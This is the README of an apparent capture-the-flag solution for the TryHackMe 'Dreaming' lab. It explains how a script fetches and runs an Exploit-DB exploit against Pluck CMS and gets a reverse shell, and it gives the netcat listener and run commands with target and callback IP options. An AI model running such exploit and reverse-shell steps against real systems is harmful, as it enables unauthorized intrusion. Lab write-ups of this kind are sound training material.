# TryHackMe: Dreaming

For the authorized Dreaming lab only; see the root [usage notice](../../README.md). `webshell.py` downloads and runs Exploit-DB entry 49909, logs into the box's Pluck CMS, and requests a reverse shell to your VPN IPv4 address on TCP port **9001**.

## Requirements
- uv
- python3

## Setup and run
You only need to install uv and that's all.
- [linux]: `bash curl -LsSf https://astral.sh/uv/install.sh | sh`
- [windows]: `pwsh powershell -c "irm https://astral.sh/uv/install.ps1 | iex"`

In a separate terminal, start a listener (the following syntax works with OpenBSD Netcat).

```bash
nc -lvnp 9001
```

Then run the script, replacing `TARGET_IP` with the box's assigned IPv4 address:

```bash
uv run dreaming -t TARGET_IP -p 80
```

To explicitly select a callback IPv4 address reachable from the box:

```bash
uv run dreaming -t TARGET_IP -p 80 -H YOUR_VPN_IPV4
```
